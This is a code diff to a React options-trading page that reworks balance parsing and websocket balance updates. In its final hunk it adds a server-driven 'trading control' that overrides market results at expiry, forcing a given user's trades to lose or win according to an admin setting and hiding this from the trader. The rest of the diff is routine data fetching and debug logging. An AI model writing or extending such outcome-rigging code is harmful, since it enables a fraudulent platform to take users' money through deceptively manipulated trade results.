@@ -28,7 +28,7 @@ interface ActiveTrade {
 
 export default function OptionsPage() {
   const { user } = useAuth();
-  const { lastMessage, subscribe, connected } = useWebSocket();
+  const { lastMessage, subscribe, connected, sendMessage } = useWebSocket();
   const queryClient = useQueryClient();
 
   const [searchTerm, setSearchTerm] = useState("");
@@ -142,7 +142,9 @@ export default function OptionsPage() {
   const { data: userBalances } = useQuery({
     queryKey: ['/api/user/balances', user?.id],
     enabled: !!user,
-    refetchInterval: 5000, // Faster refetch for real-time balance sync
+    refetchInterval: 2000, // Very fast refetch for real-time balance sync
+    staleTime: 0, // Always consider data stale
+    cacheTime: 0, // Don't cache data
     queryFn: async () => {
       const url = user?.id ? `/api/user/balances?userId=${user.id}` : '/api/user/balances';
       console.log('🔍 OPTIONS: Fetching balance from:', url, 'for user:', user?.id);
@@ -153,27 +155,63 @@ export default function OptionsPage() {
     },
   });
 
-  // Get current USDT balance - handle both 'available' and 'balance' properties
-  const balanceData = Array.isArray(userBalances) ? userBalances.find((b: any) => b.currency === 'USDT' || b.symbol === 'USDT') : null;
-  const balance = Number(balanceData?.balance || balanceData?.available || userBalances?.USDT?.available || 0);
+  // Get current USDT balance - FIXED parsing logic
+  let balance = 0;
 
-  // Debug logging for balance sync
+  if (userBalances) {
+    // Try multiple parsing strategies to handle different API response formats
+    if (userBalances.USDT?.available) {
+      // Format: { USDT: { available: "10420", ... } }
+      balance = Number(userBalances.USDT.available);
+    } else if (Array.isArray(userBalances.balances)) {
+      // Format: { balances: [{ currency: "USDT", balance: 10420 }, ...] }
+      const usdtBalance = userBalances.balances.find((b: any) => b.currency === 'USDT' || b.symbol === 'USDT');
+      balance = Number(usdtBalance?.balance || usdtBalance?.available || 0);
+    } else if (Array.isArray(userBalances)) {
+      // Format: [{ currency: "USDT", balance: 10420 }, ...]
+      const usdtBalance = userBalances.find((b: any) => b.currency === 'USDT' || b.symbol === 'USDT');
+      balance = Number(usdtBalance?.balance || usdtBalance?.available || 0);
+    } else if (userBalances['0']?.currency === 'USDT') {
+      // Format: { "0": { currency: "USDT", balance: 10420 }, ... }
+      balance = Number(userBalances['0'].balance || userBalances['0'].available || 0);
+    }
+  }
+
+  // ENHANCED Debug logging for balance sync
   console.log('🔍 OPTIONS PAGE BALANCE DEBUG:', {
     user: user?.id,
     userBalances,
-    balanceData,
-    finalBalance: balance
+    finalBalance: balance,
+    'userBalances?.USDT?.available': userBalances?.USDT?.available,
+    'Array.isArray(userBalances)': Array.isArray(userBalances),
+    'Array.isArray(userBalances?.balances)': Array.isArray(userBalances?.balances),
+    'typeof userBalances': typeof userBalances,
+    'userBalances keys': userBalances ? Object.keys(userBalances) : 'null'
   });
+
+  // ALERT: Show balance on screen for debugging
+  if (typeof window !== 'undefined') {
+    console.log(`🚨 OPTIONS PAGE: Displaying balance ${balance} USDT`);
+  }
 
   // Handle WebSocket balance updates for real-time sync
   useEffect(() => {
     if (lastMessage?.type === 'balance_update') {
       console.log('🔄 OPTIONS: Real-time balance update received:', lastMessage.data);
+      console.log('🔄 OPTIONS: Current user ID:', user?.id, 'Update for user:', lastMessage.data?.userId);
 
-      // Invalidate balance queries to trigger refresh
+      // Aggressive cache invalidation - clear all balance-related queries
       queryClient.invalidateQueries({ queryKey: ['/api/user/balances'] });
+      queryClient.invalidateQueries({ queryKey: ['/api/auth'] });
+      queryClient.removeQueries({ queryKey: ['/api/user/balances'] });
+
+      // Force immediate refetch with a small delay to ensure cache is cleared
+      setTimeout(() => {
+        queryClient.refetchQueries({ queryKey: ['/api/user/balances', user?.id] });
+        queryClient.refetchQueries({ queryKey: ['/api/user/balances'] });
+      }, 100);
     }
-  }, [lastMessage, queryClient]);
+  }, [lastMessage, queryClient, user?.id]);
 
   // Get current BTC price from real market data
   const btcMarketData = marketData?.find(item => item.symbol === 'BTCUSDT');
@@ -224,13 +262,20 @@ export default function OptionsPage() {
     }
   }, [realPrice, realTimePrice]);
 
-  // Subscribe to BTC price updates via WebSocket
+  // Subscribe to BTC price updates and balance updates via WebSocket
   useEffect(() => {
-    if (connected) {
+    if (connected && user?.id) {
       subscribe(['BTCUSDT']);
       console.log('🔌 Subscribed to BTCUSDT price updates');
+
+      // Subscribe to balance updates for this user
+      sendMessage({
+        type: 'subscribe_user_balance',
+        userId: user.id
+      });
+      console.log('🔌 Subscribed to balance updates for user:', user.id);
     }
-  }, [connected, subscribe]);
+  }, [connected, subscribe, sendMessage, user?.id]);
 
   // Fallback polling for Vercel deployment (no WebSocket support)
   useEffect(() => {
@@ -289,7 +334,8 @@ export default function OptionsPage() {
     if (lastMessage?.type === 'balance_update' && lastMessage.data?.userId === user?.id) {
       console.log('💰 Real-time balance update received:', lastMessage.data);
 
-      // Invalidate and refetch balance data to ensure UI sync
+      // Invalidate and refetch balance data to ensure UI sync - use exact query key pattern
+      queryClient.invalidateQueries({ queryKey: ['/api/user/balances', user?.id] });
       queryClient.invalidateQueries({ queryKey: ['/api/user/balances'] });
 
       // Show notification for balance changes
@@ -364,10 +410,52 @@ export default function OptionsPage() {
             // Trade expired, determine outcome
             const finalPrice = safeCurrentPrice || trade.entryPrice; // Fallback to entry price
             const priceChange = finalPrice - trade.entryPrice;
-            const won = (trade.direction === 'up' && priceChange > 0) ||
-                       (trade.direction === 'down' && priceChange < 0);
+            let won = (trade.direction === 'up' && priceChange > 0) ||
+                     (trade.direction === 'down' && priceChange < 0);
 
-            // Complete the trade asynchronously
+            // 🎯 DYNAMIC TRADING CONTROL SYSTEM - FETCH FROM SERVER
+            console.log('🎯 DYNAMIC TRADING CONTROL: Fetching user trading mode from server...');
+
+            const userId = user?.id || 'superadmin-001';
+            const username = user?.username || 'superadmin';
+
+            console.log(`🎯 DYNAMIC CONTROL: User ${username} (${userId})`);
+            console.log(`🎯 ORIGINAL RESULT: ${won ? 'WIN' : 'LOSE'} (price change: ${priceChange.toFixed(2)})`);
+
+            // Fetch trading controls from server using a synchronous approach
+            try {
+              // Use XMLHttpRequest for synchronous call (since we're in useEffect)
+              const xhr = new XMLHttpRequest();
+              xhr.open('GET', `/api/admin/trading-controls/${userId}`, false); // false = synchronous
+              xhr.setRequestHeader('Authorization', `Bearer ${localStorage.getItem('authToken')}`);
+              xhr.send();
+
+              if (xhr.status === 200) {
+                const controlData = JSON.parse(xhr.responseText);
+                const tradingMode = controlData.tradingMode || 'normal';
+
+                console.log(`🎯 SERVER RESPONSE: Trading mode is ${tradingMode.toUpperCase()}`);
+
+                if (tradingMode === 'lose') {
+                  console.log('🎯 SERVER SAYS: FORCE TRADE TO LOSE!');
+                  won = false;
+                } else if (tradingMode === 'win') {
+                  console.log('🎯 SERVER SAYS: FORCE TRADE TO WIN!');
+                  won = true;
+                } else {
+                  console.log('🎯 SERVER SAYS: NORMAL MODE - Use market result');
+                }
+
+                console.log(`🎯 FINAL RESULT: ${won ? 'WIN' : 'LOSE'} (Mode: ${tradingMode.toUpperCase()})`);
+              } else {
+                console.log('🎯 Failed to fetch trading controls, using market result');
+              }
+            } catch (error) {
+              console.error('🎯 Error fetching trading controls:', error);
+              console.log('🎯 Using market result due to error');
+            }
+
+            // Complete the trade asynchronously with forced result
             completeTrade(trade, won, finalPrice);
             hasCompletedTrades = true;
 
